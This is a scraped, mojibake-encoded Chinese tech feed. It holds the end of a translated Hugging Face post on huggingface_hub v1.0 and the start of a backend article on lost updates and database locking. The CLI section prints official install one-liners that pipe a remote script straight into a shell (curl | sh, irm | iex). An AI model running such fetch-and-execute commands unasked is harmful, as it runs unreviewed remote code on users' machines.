<h3 data-id="heading-9">é¢å‘ç°ä»£å·¥ä½œæµçš„å…¨åŠŸèƒ½å‘½ä»¤è¡Œå·¥å…·</h3>
<p>Hugging Face çš„ CLI å·¥å…·å·²ç»ä»ä¸€ä¸ªç®€å•çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå‘å±•ä¸ºä¸€ä¸ª <strong>åŠŸèƒ½å…¨é¢çš„æœºå™¨å­¦ä¹ æ“ä½œæ¥å£</strong>ã€‚å…¨æ–°è®¾è®¡çš„ <code>hf</code> å‘½ä»¤å–ä»£äº†è€æ—§çš„ <code>huggingface-cli</code>ï¼Œé‡‡ç”¨ç°ä»£åŒ–çš„â€œèµ„æº-åŠ¨ä½œâ€æ¨¡å¼ï¼š</p>
<ul>
<li><code>hf auth login</code>ï¼šç”¨æˆ·è®¤è¯</li>
<li><code>hf download</code> å’Œ <code>hf upload</code>ï¼šæ–‡ä»¶ä¸Šä¼ ä¸ä¸‹è½½</li>
<li><code>hf repo</code>ï¼šä»“åº“ç®¡ç†</li>
<li><code>hf cache ls</code> å’Œ <code>hf cache rm</code>ï¼šç¼“å­˜ç®¡ç†</li>
<li><code>hf jobs run</code>ï¼šè¿è¡Œäº‘ç«¯è®¡ç®—ä»»åŠ¡</li>
</ul>
<p>CLI æä¾›äº† <a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fdocs%2Fhuggingface_hub%2Finstallation%23install-the-hugging-face-cli" target="_blank" title="https://huggingface.co/docs/huggingface_hub/installation#install-the-hugging-face-cli" ref="nofollow noopener noreferrer">æ²™ç®±å¼å®‰è£…å™¨</a>ï¼Œå¯ä»¥åœ¨ä¸ç ´åç°æœ‰å¼€å‘ç¯å¢ƒçš„å‰æä¸‹å¿«é€Ÿå®‰è£…æˆ–å‡çº§ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># macOS æˆ– Linux</span>
curl -LsSf https://hf.co/cli/install.sh | sh

<span class="hljs-comment"># Windows</span>
powershell -ExecutionPolicy ByPass -c <span class="hljs-string">"irm https://hf.co/cli/install.ps1 | iex"</span>
</code></pre>
<p>CLI è¿˜æ”¯æŒå‘½ä»¤è‡ªåŠ¨è¡¥å…¨ï¼Œå¹¶åœ¨å„å¤§ä¸»æµå¹³å°ä¸Šéƒ½èƒ½é¡ºåˆ©è¿è¡Œã€‚å¦‚ä»Šçš„ Hugging Face CLIï¼Œå·²ç»å…·å¤‡ä¸ç°ä»£å¼€å‘å·¥å…·åª²ç¾çš„ä½“éªŒå’Œæ˜“ç”¨æ€§ã€‚</p>
<h3 data-id="heading-10">ä¸ºæœªæ¥æ¸…ç†æŠ€æœ¯å€º</h3>
<p>åœ¨ v1.0 ä¸­ï¼Œæˆ‘ä»¬ç§»é™¤äº†éƒ¨åˆ†é˜»ç¢æœªæ¥å‘å±•çš„æ—§åŠŸèƒ½å’Œç”¨æ³•ï¼š</p>
<ul>
<li>åŸºäº Git çš„ <code>Repository</code> ç±»å·²è¢«ç§»é™¤ã€‚</li>
<li>HTTP æ¥å£å¦‚ <code>upload_file()</code> å’Œ <code>create_commit()</code> å˜å¾—æ›´ç®€æ´ã€æ›´ç¨³å®šï¼Œä¹Ÿæ›´é€‚åº”ç°ä»£åŒ–å·¥ä½œæµã€‚</li>
<li><code>HfFolder</code> çš„ token ç®¡ç†æ–¹å¼å·²è¢«æ˜¾å¼çš„ <code>login()</code>ã€<code>logout()</code> å’Œ <code>get_token()</code> å‡½æ•°æ‰€å–ä»£ï¼Œä½¿ç”¨æ–¹å¼æ›´ç›´è§‚ã€‚</li>
<li>åŸæœ‰çš„ <code>InferenceApi</code> ç±»è¢«åŠŸèƒ½æ›´å®Œå–„çš„ <code>InferenceClient</code> æ›¿ä»£ã€‚</li>
<li>æ–‡ä»¶ä¼ è¾“å·¥å…· <code>hf_transfer</code> è¢«å½»åº•æ·˜æ±°ï¼Œç°å·²ç”±å…¨æ–°çš„äºŒè¿›åˆ¶å·¥å…·åŒ… <code>hf_xet</code> å®Œå…¨æ¥ç®¡ã€‚</li>
</ul>
<p>è¿™äº›å˜æ›´å¹¶éä»“ä¿ƒå†³ç­–ï¼Œæˆ‘ä»¬åœ¨æ•°æœˆå‰å°±å·²å‘å¸ƒå¼ƒç”¨é€šçŸ¥ï¼Œé™„å¸¦æ¸…æ™°çš„è¿ç§»æŒ‡å¼•ã€‚æœ€ç»ˆç›®æ ‡æ˜¯æ‰“é€ ä¸€ä¸ª <strong>æ›´æ¸…æ™°ã€æ›´æ˜“ç»´æŠ¤</strong> çš„ä»£ç åº“ï¼Œè®©æˆ‘ä»¬èƒ½å¤Ÿé›†ä¸­ç²¾åŠ›å¼€å‘é¢å‘æœªæ¥çš„æ–°ç‰¹æ€§ï¼Œè€Œä¸æ˜¯ç»§ç»­å…¼å®¹è¿‡æ—¶çš„å®ç°æ–¹å¼ã€‚</p>
<h3 data-id="heading-11">è¿ç§»æŒ‡å—</h3>
<p>æˆ‘ä»¬ç†è§£ï¼Œç ´åæ€§æ›´æ–°å¯èƒ½ä¼šå¯¹ç°æœ‰é¡¹ç›®é€ æˆå›°æ‰°ã€‚æ­£å› å¦‚æ­¤ï¼Œæˆ‘ä»¬æŠ•å…¥äº†å¤§é‡ç²¾åŠ›ï¼Œå°½å¯èƒ½è®©è¿ç§»è¿‡ç¨‹é¡ºç•…æ— ç—›ã€‚å®˜æ–¹çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fdocs%2Fhuggingface_hub%2Fconcepts%2Fmigration" target="_blank" title="https://huggingface.co/docs/huggingface_hub/concepts/migration" ref="nofollow noopener noreferrer">è¿ç§»æŒ‡å—</a> æä¾›äº†æ¯é¡¹å˜æ›´çš„ <strong>é€æ­¥è¯´æ˜</strong>ï¼Œå¹¶è§£é‡Šäº†èƒŒåçš„åŸå› ã€‚</p>
<p>æœ€é‡è¦çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨å¯èƒ½çš„åœ°æ–¹ <strong>ä¿ç•™äº†å‘åå…¼å®¹æ€§</strong>ã€‚ä¾‹å¦‚ <code>HfHubHttpError</code> åŒæ—¶ç»§æ‰¿äº†æ—§ç‰ˆ <code>requests</code> å’Œæ–°ç‰ˆ <code>httpx</code> çš„ <code>HTTPError</code> å¼‚å¸¸ç±»ï¼Œç¡®ä¿åŸæœ‰é”™è¯¯å¤„ç†é€»è¾‘ä¾ç„¶ç”Ÿæ•ˆã€‚</p>
<p>ä» v1.0 èµ·ï¼Œæˆ‘ä»¬å°†<strong>å…¨é¢èšç„¦æ–°ç‰ˆ</strong>çš„å¼€å‘ä¸ç»´æŠ¤ï¼Œç¡®ä¿ä¸ºç¤¾åŒºæä¾›æ›´é«˜æ€§èƒ½ã€æ›´ä¸°å¯ŒåŠŸèƒ½å’Œæ›´å®Œå–„çš„å·¥å…·ã€‚æ—§ç‰ˆï¼ˆv0.*ï¼‰ä»å¯åœ¨ PyPI ä¸‹è½½ï¼Œä½†ä»Šååªä¼šè¿›è¡Œå®‰å…¨æ€§è¡¥ä¸æ›´æ–°ï¼Œä¸å†æ·»åŠ æ–°åŠŸèƒ½ã€‚</p>
<blockquote>
<p>æˆ‘ä»¬å°½åŠ›ç¡®ä¿ <code>huggingface_hub</code> v1.0.0 ä¸æ—§ç‰ˆå…¼å®¹ã€‚åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œå¤§å¤šæ•°æœºå™¨å­¦ä¹ åº“åœ¨ v0.x ä¸ v1.x ä¹‹é—´éƒ½èƒ½æ— ç¼åˆ‡æ¢ã€‚ä¸»è¦ä¾‹å¤–æ˜¯ <code>transformers</code>ï¼šå…¶ v4 ç‰ˆæœ¬æ˜ç¡®ä¾èµ– v0.xï¼Œè€Œå³å°†å‘å¸ƒçš„ v5 å°†æ”¹ä¸ºä¾èµ– v1.xã€‚æƒ³äº†è§£å„ä¸»æµåº“çš„å…¼å®¹æƒ…å†µï¼Œè¯·å‚è€ƒè¿™ä¸ª <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhuggingface%2Fhuggingface_hub%2Fissues%2F3340" target="_blank" title="https://github.com/huggingface/huggingface_hub/issues/3340" ref="nofollow noopener noreferrer">å…¼å®¹æ€§æ±‡æ€»è¡¨</a>ã€‚</p>
</blockquote>
<h2 data-id="heading-12">ç‰¹åˆ«è‡´è°¢</h2>
<p>æ„Ÿè°¢ 280 å¤šä½ä¸ºæœ¬åº“è´¡çŒ®ä»£ç ã€æ–‡æ¡£ã€ç¿»è¯‘å’Œç¤¾åŒºæ”¯æŒçš„å¼€å‘è€…ä»¬ï¼</p>
<p>åŒæ—¶ä¹Ÿæ„Ÿè°¢ Hugging Face ç¤¾åŒºæä¾›çš„åé¦ˆã€Bug æŠ¥å‘Šä¸å»ºè®®ï¼Œè¿™äº›éƒ½å¸®åŠ©æˆ‘ä»¬ä¸æ–­å®Œå–„äº§å“ã€‚</p>
<p>æœ€åï¼Œè¡·å¿ƒæ„Ÿè°¢å¹¿å¤§ç”¨æˆ· â€”â€” æ— è®ºæ˜¯ç‹¬ç«‹å¼€å‘è€…è¿˜æ˜¯å¤§å‹ä¼ä¸š â€”â€” æ„Ÿè°¢ä½ ä»¬ä¿¡ä»» <code>huggingface_hub</code>ï¼Œè®©å®ƒæˆä¸ºä½ ä»¬å·¥ä½œæµç¨‹çš„ä¸€éƒ¨åˆ†ã€‚æ˜¯ä½ ä»¬çš„æ”¯æŒæ¿€åŠ±æˆ‘ä»¬ä¸æ–­å‰è¡Œã€‚</p>
<p>å¦‚æœä½ å–œæ¬¢è¿™ä¸ªé¡¹ç›®ï¼Œæ¬¢è¿åˆ° <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhuggingface%2Fhuggingface_hub" target="_blank" title="https://github.com/huggingface/huggingface_hub" ref="nofollow noopener noreferrer">GitHub ç‚¹ä¸ªæ˜Ÿ â­</a>ï¼Œæ”¯æŒæˆ‘ä»¬ç»§ç»­å»ºè®¾å¼€æºæœºå™¨å­¦ä¹ çš„æœªæ¥ï¼</p>
<p>äº”å¹´å·²è¿‡ï¼Œä½†ä¸€åˆ‡æ‰åˆšåˆšå¼€å§‹ï¼</p>
<blockquote>
<p>è‹±æ–‡åŸæ–‡: <a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fblog%2Fhuggingface-hub-v1" target="_blank" title="https://huggingface.co/blog/huggingface-hub-v1" ref="nofollow noopener noreferrer">huggingface.co/blog/hugginâ€¦</a></p>
<p>åŸæ–‡ä½œè€…: Lucain Pouget, CÃ©lina Hanouti, Lysandre, Julien Chaumond</p>
<p>è¯‘è€…: Luke,  Hugging Face Fellow</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€åç«¯è¿›é˜¶ã€‘å¹¶å‘ç«æ€ä¸é”é€‰å‹]]></title>    <link>https://juejin.cn/post/7582813955212525609</link>    <guid>https://juejin.cn/post/7582813955212525609</guid>    <pubDate>2025-12-13T03:19:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582813955212525609" data-draft-id="7583139562734764075" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€åç«¯è¿›é˜¶ã€‘å¹¶å‘ç«æ€ä¸é”é€‰å‹"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-13T03:19:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ›¾å¯Œè´µ"/> <meta itemprop="url" content="https://juejin.cn/user/4212984286289806"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€åç«¯è¿›é˜¶ã€‘å¹¶å‘ç«æ€ä¸é”é€‰å‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4212984286289806/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ›¾å¯Œè´µ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T03:19:02.000Z" title="Sat Dec 13 2025 03:19:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"ğŸ‹"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"ğŸ“"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"ğŸ‘"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"ğŸ‰"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"ğŸ’"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="androidstudio">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#a9b7c6;background:#282b2e}.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#6897bb}.hljs-deletion,.hljs-keyword,.hljs-selector-tag{color:#cc7832}.hljs-link,.hljs-template-variable,.hljs-variable{color:#629755}.hljs-comment,.hljs-quote{color:grey}.hljs-meta{color:#bbb529}.hljs-addition,.hljs-attribute,.hljs-string{color:#6a8759}.hljs-section,.hljs-title,.hljs-type{color:#ffc66d}.hljs-name,.hljs-selector-class,.hljs-selector-id{color:#e8bf6a}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€ äº‹åŠ¡çš„å±€é™æ€§</h2>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å˜æ¸…äº‹åŠ¡çš„æ ¸å¿ƒä½œç”¨ã€‚</p>
<p>å¤§å¤šæ•°å…³ç³»å‹æ•°æ®åº“ï¼ˆå¦‚ MySQL/PostgreSQLï¼‰çš„äº‹åŠ¡ä¸»è¦ä¿è¯ <strong>ACID</strong> ä¸­çš„ <strong>Aï¼ˆåŸå­æ€§ï¼‰</strong>ï¼š</p>
<blockquote>
<p><strong>åŸå­æ€§</strong>ï¼šä¸€ç³»åˆ—æ“ä½œè¦ä¹ˆå…¨éƒ¨æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥ã€‚</p>
</blockquote>
<p>ä½†å®ƒ<strong>é»˜è®¤</strong>å¹¶ä¸èƒ½å®Œå…¨è§£å†³å¹¶å‘ä¸‹çš„ <strong>Iï¼ˆéš”ç¦»æ€§ï¼‰</strong> é—®é¢˜ï¼ˆå¤šä¸ªå¹¶å‘äº‹åŠ¡ä¹‹é—´äº’ä¸å¹²æ‰°ï¼‰ã€‚</p>
<h3 data-id="heading-1">å…¸å‹çš„â€œè¯»-æ”¹-å†™â€æ­»å±€</h3>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ‰£å‡åº“å­˜çš„ä¸šåŠ¡é€»è¾‘ï¼Œä»£ç å¦‚ä¸‹ï¼ˆä¼ªä»£ç ï¼‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å¼€å¯äº‹åŠ¡</span>
<span class="hljs-keyword">await</span> prisma.$transaction(<span class="hljs-keyword">async</span> (tx) =&gt; {
  <span class="hljs-comment">// 1. è¯»ï¼šæŸ¥è¯¢å½“å‰åº“å­˜</span>
  <span class="hljs-keyword">const</span> product = <span class="hljs-keyword">await</span> tx.<span class="hljs-property">product</span>.<span class="hljs-title function_">findUnique</span>({ <span class="hljs-attr">where</span>: { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span> } });
  
  <span class="hljs-comment">// 2. ç®—ï¼šå†…å­˜åˆ¤æ–­</span>
  <span class="hljs-keyword">if</span> (product.<span class="hljs-property">stock</span> &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'åº“å­˜ä¸è¶³'</span>);
  
  <span class="hljs-comment">// 3. å†™ï¼šæ›´æ–°åº“å­˜</span>
  <span class="hljs-keyword">await</span> tx.<span class="hljs-property">product</span>.<span class="hljs-title function_">update</span>({
    <span class="hljs-attr">where</span>: { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span> },
    <span class="hljs-attr">data</span>: { <span class="hljs-attr">stock</span>: product.<span class="hljs-property">stock</span> - <span class="hljs-number">1</span> }
  });
});
</code></pre>
<p><strong>å¹¶å‘åœºæ™¯ï¼š</strong>
å¦‚æœ A å’Œ B ä¸¤ä¸ªç”¨æˆ·åŒæ—¶è¿›æ¥ï¼š</p>
<ol>
<li>A è¯»åˆ°åº“å­˜ä¸º 1ã€‚</li>
<li>B è¯»åˆ°åº“å­˜ä¸º 1ï¼ˆå› ä¸º A æ²¡é”æ•°æ®ï¼‰ã€‚</li>
<li>A å‡ 1 å†™å…¥ 0ã€‚</li>
<li>B å‡ 1 å†™å…¥ 0ã€‚
<strong>ç»“æœï¼š</strong> å–å‡ºäº†ä¸¤ä»¶å•†å“ï¼Œåº“å­˜åªå‡äº† 1ã€‚è¿™å°±æ˜¯å…¸å‹çš„ <strong>ä¸¢å¤±æ›´æ–°ï¼ˆLost Updateï¼‰</strong>ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-2">äºŒã€ è§£å†³æ–¹æ¡ˆä¸€ï¼šå•æŒ‡ä»¤åŸå­åŒ–ï¼ˆæ¨èï¼‰</h2>
<p>å¦‚æœä½ çš„ä¸šåŠ¡é€»è¾‘éå¸¸ç®€å•ï¼Œä»…ä»…æ˜¯æ•°å€¼çš„å¢å‡ï¼Œ<strong>æœ€å¥½çš„åŠæ³•æ˜¯å®Œå…¨ç»•è¿‡â€œè¯»-æ”¹-å†™â€çš„æ­¥éª¤</strong>ï¼Œç›´æ¥åˆ©ç”¨æ•°æ®åº“è‡ªèº«çš„åŸå­èƒ½åŠ›ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä¸éœ€è¦æŸ¥å‡ºæ¥è®¡ç®—ï¼Œç›´æ¥æ¨ç»™æ•°æ®åº“å»ç®—</span>
<span class="hljs-keyword">await</span> prisma.<span class="hljs-property">product</span>.<span class="hljs-title function_">update</span>({
  <span class="hljs-attr">where</span>: { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span> },
  <span class="hljs-attr">data</span>: {
    <span class="hljs-attr">stock</span>: { <span class="hljs-attr">decrement</span>: <span class="hljs-number">1</span> } <span class="hljs-comment">// åŸå­æ“ä½œï¼šUPDATE product SET stock = stock - 1 ...</span>
  }
});
</code></pre>
<p><strong>ä¼˜ç‚¹</strong>ï¼šæ€§èƒ½æœ€é«˜ï¼Œä¸éœ€è¦å¤æ‚çš„é”æœºåˆ¶ã€‚
<strong>ç¼ºç‚¹</strong>ï¼šåªèƒ½å¤„ç†ç®€å•é€»è¾‘ã€‚å¦‚æœéœ€è¦åˆ¤æ–­â€œç”¨æˆ·ç­‰çº§â€ã€â€œé™è´­æ•°é‡â€ç­‰å¤æ‚ä¸šåŠ¡ï¼Œå•æ¡ SQL æ— æ³•æ»¡è¶³ã€‚</p>
<hr/>
<h2 data-id="heading-3">ä¸‰ã€ è§£å†³æ–¹æ¡ˆäºŒï¼šæ‚²è§‚é”ï¼ˆPessimistic Lockingï¼‰</h2>
<p>å½“é€»è¾‘å¤æ‚å¿…é¡»åˆ†æ­¥æ‰§è¡Œï¼Œä¸”æ˜¯<strong>å†™å¤šï¼ˆé«˜é¢‘å¹¶å‘å†™å…¥ï¼‰</strong> çš„åœºæ™¯æ—¶ï¼Œæˆ‘ä»¬éœ€è¦<strong>æ‚²è§‚é”</strong>ã€‚</p>
<h3 data-id="heading-4">é€šä¿—ç†è§£</h3>
<p>â€œå…¬å…±å•æ‰€çš„å‘ä½ï¼ˆæ•°æ®ï¼‰æœ‰é™ä¸”ç«äº‰æ¿€çƒˆï¼Œä¸ºäº†é˜²æ­¢æˆ‘åœ¨é‡Œé¢åŠäº‹çš„æ—¶å€™è¢«åˆ«äººæ¨é—¨è€Œå…¥ï¼Œæˆ‘è¿›é—¨çš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯<strong>å…ˆæŠŠé—¨åé”</strong>ã€‚ç›´åˆ°æˆ‘åŠå®Œäº‹å‡ºæ¥ï¼Œä¸‹ä¸€ä¸ªäººæ‰èƒ½è¿›å»ã€‚â€</p>
<h3 data-id="heading-5">âš ï¸ å…³é”®å‰æï¼šå¿…é¡»é…åˆäº‹åŠ¡</h3>
<p><strong>æ‚²è§‚é”æ˜¯ä¾èµ–æ•°æ®åº“äº‹åŠ¡ï¼ˆTransactionï¼‰çš„ã€‚</strong></p>
<ul>
<li>åªæœ‰åœ¨ <code>BEGIN</code> ... <code>COMMIT/ROLLBACK</code> ä¹‹é—´ï¼Œé”æ‰ç”Ÿæ•ˆã€‚</li>
<li>ä¸€æ—¦äº‹åŠ¡æäº¤æˆ–å›æ»šï¼Œ<strong>é”ä¼šè‡ªåŠ¨è§£é™¤</strong>ã€‚å¦‚æœä¸å¼€å¯äº‹åŠ¡ï¼ŒSQL è¯­å¥æ‰§è¡Œå®Œçš„ç¬é—´é”å°±é‡Šæ”¾äº†ï¼Œæ²¡æœ‰ä»»ä½•æ„ä¹‰ã€‚</li>
</ul>
<h3 data-id="heading-6">å®ç°æ–¹å¼</h3>
<p>åœ¨ SQL ä¸­ä½¿ç”¨ <code>SELECT ... FOR UPDATE</code>ã€‚</p>
